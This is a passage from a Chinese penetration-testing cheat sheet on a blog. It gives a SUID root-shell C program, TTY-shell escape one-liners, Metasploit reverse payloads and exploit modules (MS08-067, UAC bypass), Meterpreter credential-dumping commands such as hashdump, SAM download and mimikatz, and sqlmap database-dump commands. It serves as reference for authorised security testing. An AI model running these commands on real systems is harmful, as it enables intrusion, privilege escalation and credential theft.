</span></span></code></pre></td></tr></table></div></div><h3 id=运行-binsh的suid-c-shell>运行 /bin/sh的SUID C Shell<a hidden class=anchor aria-hidden=true href=#运行-binsh的suid-c-shell>#</a></h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-83-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-83-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>int main(void){
</span></span><span style=display:flex><span>       setresuid(0, 0, 0);
</span></span><span style=display:flex><span>       system(&#34;/bin/sh&#34;);
</span></span><span style=display:flex><span>}       
</span></span></code></pre></td></tr></table></div></div><h3 id=构建-suid-shell-二进制>构建 SUID Shell 二进制<a hidden class=anchor aria-hidden=true href=#构建-suid-shell-二进制>#</a></h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>gcc -o suid suid.c  
</span></span></code></pre></td></tr></table></div></div><p>32位</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>gcc -m32 -o suid suid.c  
</span></span></code></pre></td></tr></table></div></div><h2 id=反向shells>反向Shells<a hidden class=anchor aria-hidden=true href=#反向shells>#</a></h2><p>参考 <a href=https://highon.coffee/blog/reverse-shell-cheat-sheet/>反向 Shell 速查表</a> 。</p><h2 id=tty-shells>TTY Shells<a hidden class=anchor aria-hidden=true href=#tty-shells>#</a></h2><p>Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like <code>su</code> from reverse shells.</p><p>一些模拟出TTY终端窗口以突破shell限制的技巧，便于从反向shell上执行类似 <code>su</code> 的特殊命令。</p><h3 id=用python模拟-tty-shell的技巧>用Python模拟 TTY Shell的技巧<a hidden class=anchor aria-hidden=true href=#用python模拟-tty-shell的技巧>#</a></h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-86-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-86-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-87-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-87-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>echo os.system(&#39;/bin/bash&#39;)
</span></span></code></pre></td></tr></table></div></div><h3 id=用sh模拟交互式shell>用sh模拟交互式shell<a hidden class=anchor aria-hidden=true href=#用sh模拟交互式shell>#</a></h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-88-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-88-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>/bin/sh -i
</span></span></code></pre></td></tr></table></div></div><h3 id=用perl模拟-tty-shell>用Perl模拟 TTY Shell<a hidden class=anchor aria-hidden=true href=#用perl模拟-tty-shell>#</a></h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-89-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-89-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-89-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-89-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>exec &#34;/bin/sh&#34;;
</span></span><span style=display:flex><span>perl —e &#39;exec &#34;/bin/sh&#34;;&#39;
</span></span></code></pre></td></tr></table></div></div><h3 id=用ruby模拟-tty-shell>用Ruby模拟 TTY Shell<a hidden class=anchor aria-hidden=true href=#用ruby模拟-tty-shell>#</a></h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>exec &#34;/bin/sh&#34;
</span></span></code></pre></td></tr></table></div></div><h3 id=用lua-模拟tty-shell>用Lua 模拟TTY Shell<a hidden class=anchor aria-hidden=true href=#用lua-模拟tty-shell>#</a></h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>os.execute(&#39;/bin/sh&#39;)
</span></span></code></pre></td></tr></table></div></div><h3 id=从vi模拟tty-shell>从Vi模拟TTY Shell<a hidden class=anchor aria-hidden=true href=#从vi模拟tty-shell>#</a></h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>:!bash
</span></span></code></pre></td></tr></table></div></div><h3 id=用nmap模拟tty-shell>用NMAP模拟TTY Shell<a hidden class=anchor aria-hidden=true href=#用nmap模拟tty-shell>#</a></h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-93-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-93-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>!sh
</span></span></code></pre></td></tr></table></div></div><h2 id=metasploit-速查表>Metasploit 速查表<a hidden class=anchor aria-hidden=true href=#metasploit-速查表>#</a></h2><p>这是一个metasploit方便的速查手册。关于跳板技术可参看 <a href=https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/>Meterpreter Pivoting</a> 。</p><h3 id=meterpreter-payloads>Meterpreter Payloads<a hidden class=anchor aria-hidden=true href=#meterpreter-payloads>#</a></h3><h3 id=windows-反向meterpreter-payload>Windows 反向meterpreter payload<a hidden class=anchor aria-hidden=true href=#windows-反向meterpreter-payload>#</a></h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>set payload windows/meterpreter/reverse_tcp</code></td><td>Windows 反向tcp payload</td></tr></tbody></table><h3 id=windows-vnc-meterpreter-payload>Windows VNC Meterpreter payload<a hidden class=anchor aria-hidden=true href=#windows-vnc-meterpreter-payload>#</a></h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>set payload windows/vncinject/reverse_tcp``set ViewOnly false</code></td><td>Meterpreter Windows VNC Payload</td></tr></tbody></table><h3 id=linux-反向meterpreter-payload>Linux 反向Meterpreter payload<a hidden class=anchor aria-hidden=true href=#linux-反向meterpreter-payload>#</a></h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>set payload linux/meterpreter/reverse_tcp</code></td><td>Meterpreter Linux 反向Payload</td></tr></tbody></table><h2 id=meterpreter速查表>Meterpreter速查表<a hidden class=anchor aria-hidden=true href=#meterpreter速查表>#</a></h2><p>有用的meterpreter 命令。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>upload file c:\\windows</code></td><td>Meterpreter上传文件到 Windows 目标</td></tr><tr><td><code>download c:\\windows\\repair\\sam /tmp</code></td><td>Meterpreter 从 Windows 目标下载文件</td></tr><tr><td><code>execute -f c:\\windows\temp\exploit.exe</code></td><td>Meterpreter 在目标机器上执行.exe文件——用来执行上传的exp很方便</td></tr><tr><td><code>execute -f cmd -c</code></td><td>创建新的cmd shell通道</td></tr><tr><td><code>ps</code></td><td>Meterpreter显示进程</td></tr><tr><td><code>shell</code></td><td>Meterpreter获取目标shell</td></tr><tr><td><code>getsystem</code></td><td>Meterpreter尝试提权</td></tr><tr><td><code>hashdump</code></td><td>Meterpreter尝试导出目标机器上的哈希</td></tr><tr><td><code>portfwd add –l 3389 –p 3389 –r target</code></td><td>Meterpreter端口转发</td></tr><tr><td><code>portfwd delete –l 3389 –p 3389 –r target</code></td><td>Meterpreter删除端口转发</td></tr></tbody></table><h2 id=常用metasploit-模块>常用Metasploit 模块<a hidden class=anchor aria-hidden=true href=#常用metasploit-模块>#</a></h2><p>最常用的metasploit 模块。</p><h3 id=远程windows-metasploit-模块exploits>远程Windows Metasploit 模块(exploits)<a hidden class=anchor aria-hidden=true href=#远程windows-metasploit-模块exploits>#</a></h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>use exploit/windows/smb/ms08_067_netapi</code></td><td>MS08_067 Windows 2k, XP, 2003 远程攻击</td></tr><tr><td><code>use exploit/windows/dcerpc/ms06_040_netapi</code></td><td>MS08_040 Windows NT, 2k, XP, 2003 远程攻击</td></tr><tr><td><code>use exploit/windows/smb/ms09_050_smb2_negotiate_func_index</code></td><td>MS09_050 Windows Vista SP1/SP2 和Server 2008 (x86) 远程攻击</td></tr></tbody></table><h3 id=本地windows-metasploit-模块exploits>本地Windows Metasploit 模块(exploits)<a hidden class=anchor aria-hidden=true href=#本地windows-metasploit-模块exploits>#</a></h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>use exploit/windows/local/bypassuac</code></td><td>绕过 Windows 7 上的UAC</td></tr></tbody></table><h3 id=辅助metasploit-模块>辅助Metasploit 模块<a hidden class=anchor aria-hidden=true href=#辅助metasploit-模块>#</a></h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>use auxiliary/scanner/http/dir_scanner</code></td><td>Metasploit HTTP 目录扫描</td></tr><tr><td><code>use auxiliary/scanner/http/jboss_vulnscan</code></td><td>Metasploit JBOSS 漏扫</td></tr><tr><td><code>use auxiliary/scanner/mssql/mssql_login</code></td><td>Metasploit MSSQL 认证扫描</td></tr><tr><td><code>use auxiliary/scanner/mysql/mysql_version</code></td><td>Metasploit MSSQL 版本扫描</td></tr><tr><td><code>use auxiliary/scanner/oracle/oracle_login</code></td><td>Metasploit Oracle 登陆模块</td></tr></tbody></table><h3 id=metasploit-powershell-模块>Metasploit Powershell 模块<a hidden class=anchor aria-hidden=true href=#metasploit-powershell-模块>#</a></h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>use exploit/multi/script/web_delivery</code></td><td>Metasploit powershell payload c传送模块</td></tr><tr><td><code>post/windows/manage/powershell/exec_powershell</code></td><td>Metasploit通过会话上传和执行 powershell脚本</td></tr><tr><td><code>use exploit/multi/http/jboss_maindeployer</code></td><td>Metasploit JBOSS 部署</td></tr><tr><td><code>use exploit/windows/mssql/mssql_payload</code></td><td>Metasploit MSSQL payload</td></tr></tbody></table><h3 id=windows-后渗透metasploit-模块>Windows 后渗透Metasploit 模块<a hidden class=anchor aria-hidden=true href=#windows-后渗透metasploit-模块>#</a></h3><p>Windows Metasploit 提权模块。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>run post/windows/gather/win_privs</code></td><td>Metasploit 显示当前用户权限</td></tr><tr><td><code>use post/windows/gather/credentials/gpp</code></td><td>Metasploit 提取 GPP 保存的密码</td></tr><tr><td><code>load mimikatz -> wdigest</code></td><td>Metasplit 加载 Mimikatz</td></tr><tr><td><code>run post/windows/gather/local_admin_search_enum</code></td><td>检查当前用户是否对域内其他机器有管理员权限</td></tr><tr><td><code>run post/windows/gather/smart_hashdump</code></td><td>自动化导出sam 文件，尝试提权等。</td></tr></tbody></table><h2 id=ascii表速查>ASCII表速查<a hidden class=anchor aria-hidden=true href=#ascii表速查>#</a></h2><p>对Web应用渗透测试很有用，或者你被困在火星而需要和NASA通信。（梗自《火星救援》）</p><table><thead><tr><th>ASCII</th><th>字符</th></tr></thead><tbody><tr><td><code>x00</code></td><td>Null Byte 空字节</td></tr><tr><td><code>x08</code></td><td>BS 退格</td></tr><tr><td><code>x09</code></td><td>TAB 水平制表符</td></tr><tr><td><code>x0a</code></td><td>LF 换行</td></tr><tr><td><code>x0d</code></td><td>CR 回车</td></tr><tr><td><code>x1b</code></td><td>ESC</td></tr><tr><td><code>x20</code></td><td>SPC 空格</td></tr><tr><td><code>x21</code></td><td>!</td></tr><tr><td><code>x22</code></td><td>"</td></tr><tr><td><code>x23</code></td><td>#</td></tr><tr><td><code>x24</code></td><td>$</td></tr><tr><td><code>x25</code></td><td>%</td></tr><tr><td><code>x26</code></td><td>&</td></tr><tr><td><code>x27</code></td><td>`</td></tr><tr><td><code>x28</code></td><td>(</td></tr><tr><td><code>x29</code></td><td>)</td></tr><tr><td><code>x2a</code></td><td>*</td></tr><tr><td><code>x2b</code></td><td>+</td></tr><tr><td><code>x2c</code></td><td>,</td></tr><tr><td><code>x2d</code></td><td>-</td></tr><tr><td><code>x2e</code></td><td>.</td></tr><tr><td><code>x2f</code></td><td>/</td></tr><tr><td><code>x30</code></td><td>0</td></tr><tr><td><code>x31</code></td><td>1</td></tr><tr><td><code>x32</code></td><td>2</td></tr><tr><td><code>x33</code></td><td>3</td></tr><tr><td><code>x34</code></td><td>4</td></tr><tr><td><code>x35</code></td><td>5</td></tr><tr><td><code>x36</code></td><td>6</td></tr><tr><td><code>x37</code></td><td>7</td></tr><tr><td><code>x38</code></td><td>8</td></tr><tr><td><code>x39</code></td><td>9</td></tr><tr><td><code>x3a</code></td><td>:</td></tr><tr><td><code>x3b</code></td><td>;</td></tr><tr><td><code>x3c</code></td><td>&lt;</td></tr><tr><td><code>x3d</code></td><td>=</td></tr><tr><td><code>x3e</code></td><td>></td></tr><tr><td><code>x3f</code></td><td>?</td></tr><tr><td><code>x40</code></td><td>@</td></tr><tr><td><code>x41</code></td><td>A</td></tr><tr><td><code>x42</code></td><td>B</td></tr><tr><td><code>x43</code></td><td>C</td></tr><tr><td><code>x44</code></td><td>D</td></tr><tr><td><code>x45</code></td><td>E</td></tr><tr><td><code>x46</code></td><td>F</td></tr><tr><td><code>x47</code></td><td>G</td></tr><tr><td><code>x48</code></td><td>H</td></tr><tr><td><code>x49</code></td><td>I</td></tr><tr><td><code>x4a</code></td><td>J</td></tr><tr><td><code>x4b</code></td><td>K</td></tr><tr><td><code>x4c</code></td><td>L</td></tr><tr><td><code>x4d</code></td><td>M</td></tr><tr><td><code>x4e</code></td><td>N</td></tr><tr><td><code>x4f</code></td><td>O</td></tr><tr><td><code>x50</code></td><td>P</td></tr><tr><td><code>x51</code></td><td>Q</td></tr><tr><td><code>x52</code></td><td>R</td></tr><tr><td><code>x53</code></td><td>S</td></tr><tr><td><code>x54</code></td><td>T</td></tr><tr><td><code>x55</code></td><td>U</td></tr><tr><td><code>x56</code></td><td>V</td></tr><tr><td><code>x57</code></td><td>W</td></tr><tr><td><code>x58</code></td><td>X</td></tr><tr><td><code>x59</code></td><td>Y</td></tr><tr><td><code>x5a</code></td><td>Z</td></tr><tr><td><code>x5b</code></td><td>[</td></tr><tr><td><code>x5c</code></td><td>\</td></tr><tr><td><code>x5d</code></td><td>]</td></tr><tr><td><code>x5e</code></td><td>^</td></tr><tr><td><code>x5f</code></td><td>_</td></tr><tr><td><code>x60</code></td><td>`</td></tr><tr><td><code>x61</code></td><td>a</td></tr><tr><td><code>x62</code></td><td>b</td></tr><tr><td><code>x63</code></td><td>c</td></tr><tr><td><code>x64</code></td><td>d</td></tr><tr><td><code>x65</code></td><td>e</td></tr><tr><td><code>x66</code></td><td>f</td></tr><tr><td><code>x67</code></td><td>g</td></tr><tr><td><code>x68</code></td><td>h</td></tr><tr><td><code>x69</code></td><td>i</td></tr><tr><td><code>x6a</code></td><td>j</td></tr><tr><td><code>x6b</code></td><td>k</td></tr><tr><td><code>x6c</code></td><td>l</td></tr><tr><td><code>x6d</code></td><td>m</td></tr><tr><td><code>x6e</code></td><td>n</td></tr><tr><td><code>x6f</code></td><td>o</td></tr><tr><td><code>x70</code></td><td>p</td></tr><tr><td><code>x71</code></td><td>q</td></tr><tr><td><code>x72</code></td><td>r</td></tr><tr><td><code>x73</code></td><td>s</td></tr><tr><td><code>x74</code></td><td>t</td></tr><tr><td><code>x75</code></td><td>u</td></tr><tr><td><code>x76</code></td><td>v</td></tr><tr><td><code>x77</code></td><td>w</td></tr><tr><td><code>x78</code></td><td>x</td></tr><tr><td><code>x79</code></td><td>y</td></tr><tr><td><code>x7a</code></td><td>z</td></tr></tbody></table><h2 id=cisco-ios网际操作系统-命令>CISCO IOS(网际操作系统) 命令<a hidden class=anchor aria-hidden=true href=#cisco-ios网际操作系统-命令>#</a></h2><p>收集一些有用的Cisco IOS 命令.</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>enable</code></td><td>进入使能模式</td></tr><tr><td><code>conf t</code></td><td>配置终端</td></tr><tr><td><code>(config)# interface fa0/0</code></td><td>配置 FastEthernet 0/0</td></tr><tr><td><code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code></td><td>添加IP到 fa0/0</td></tr><tr><td><code>(config-if)# line vty 0 4</code></td><td>配置 vty line</td></tr><tr><td><code>(config-line)# login</code></td><td>登陆</td></tr><tr><td><code>(config-line)# password YOUR-PASSWORD</code></td><td>设置 telnet 密码</td></tr><tr><td><code># show running-config</code></td><td>显示内存中的运行配置</td></tr><tr><td><code># show startup-config</code></td><td>显示启动配置</td></tr><tr><td><code># show version</code></td><td>显示cisco IOS 版本</td></tr><tr><td><code># show session</code></td><td>显示已打开的会话</td></tr><tr><td><code># show ip interface</code></td><td>显示网卡</td></tr><tr><td><code># show interface e0</code></td><td>显示网络接口细节</td></tr><tr><td><code># show ip route</code></td><td>显示路由</td></tr><tr><td><code># show access-lists</code></td><td>显示access lists</td></tr><tr><td><code># dir file systems</code></td><td>列出可用文件</td></tr><tr><td><code># dir all-filesystems</code></td><td>显示文件信息</td></tr><tr><td><code># dir /all</code></td><td>显示已删除文件</td></tr><tr><td><code># terminal length 0</code></td><td>取消终端输出长度限制</td></tr><tr><td><code># copy running-config tftp</code></td><td>复制运行配置到tftp 服务器</td></tr><tr><td><code># copy running-config startup-config</code></td><td>复制启动配置到运行配置</td></tr></tbody></table><h2 id=密码学>密码学<a hidden class=anchor aria-hidden=true href=#密码学>#</a></h2><h3 id=哈希长度>哈希长度<a hidden class=anchor aria-hidden=true href=#哈希长度>#</a></h3><table><thead><tr><th>哈希</th><th>长度</th></tr></thead><tbody><tr><td>MD5</td><td><code>16 Bytes</code></td></tr><tr><td>SHA-1</td><td><code>20 Bytes</code></td></tr><tr><td>SHA-256</td><td><code>32 Bytes</code></td></tr><tr><td>SHA-512</td><td><code>64 Bytes</code></td></tr></tbody></table><h3 id=哈希例子>哈希例子<a hidden class=anchor aria-hidden=true href=#哈希例子>#</a></h3><p>可以直接使用 <strong>hash-identifier</strong> 命令判断哈希类型，但这里还是举些例子。</p><table><thead><tr><th>哈希</th><th>例子</th></tr></thead><tbody><tr><td>MD5 Hash Example</td><td><code>8743b52063cd84097a65d1633f5c74f5</code></td></tr><tr><td>MD5 $PASS:$SALT Example</td><td><code>01dfae6e5d4d90d9892622325959afbe:7050461</code></td></tr><tr><td>MD5 $SALT:$PASS</td><td><code>f0fda58630310a6dd91a7d8f0a4ceda2:4225637426</code></td></tr><tr><td>SHA1 Hash Example</td><td><code>b89eaac7e61417341b710b727768294d0e6a277b</code></td></tr><tr><td>SHA1 $PASS:$SALT</td><td><code>2fc5a684737ce1bf7b3b239df432416e0dd07357:2014</code></td></tr><tr><td>SHA1 $SALT:$PASS</td><td><code>cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024</code></td></tr><tr><td>SHA-256</td><td><code>127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935</code></td></tr><tr><td>SHA-256 $PASS:$SALT</td><td><code>c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4</code></td></tr><tr><td>SHA-256 $SALT:$PASS</td><td><code>eb368a2dfd38b405f014118c7d9747fcc97f4f0ee75c05963cd9da6ee65ef498:560407001617</code></td></tr><tr><td>SHA-512</td><td><code>82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f</code></td></tr><tr><td>SHA-512 $PASS:$SALT</td><td><code>e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd</code></td></tr><tr><td>SHA-512 $SALT:$PASS</td><td><code>976b451818634a1e2acba682da3fd6efa72adf8a7a08d7939550c244b237c72c7d42367544e826c0c83fe5c02f97c0373b6b1386cc794bf0d21d2df01bb9c08a</code></td></tr><tr><td>NTLM Hash Example</td><td><code>b4b9b02e6f09a9bd760f388b67351e2b</code></td></tr></tbody></table><h2 id=sqlmap例子>SQLMap例子<a hidden class=anchor aria-hidden=true href=#sqlmap例子>#</a></h2><p>小型 SQLMap 速查表：</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3</code></td><td>自动化sqlmap扫描</td></tr><tr><td><code>sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php"</code></td><td>指定目标的sqlmap scan</td></tr><tr><td><code>sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump</code></td><td>使用联合查询技术扫描mysql后端的基于报错的注入 ，使用随机UA，导出数据库</td></tr><tr><td><code>sqlmap -o -u "http://meh.com/form/" --forms</code></td><td>检测可能存在注入点表单</td></tr><tr><td><code>sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump</code></td><td>导出指定数据库的user表并尝试破解哈希。</td></tr></tbody></table></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://ret2neo.cn/post/180811-xxe-injection/><span class=title>« Prev</span><br><span>XML外部实体注入小结</span></a>
<a class=next href=https://ret2neo.cn/post/180721meepwnmaplstory/><span class=title>Next »</span><br><span>Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://ret2neo.cn/>闲言语</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
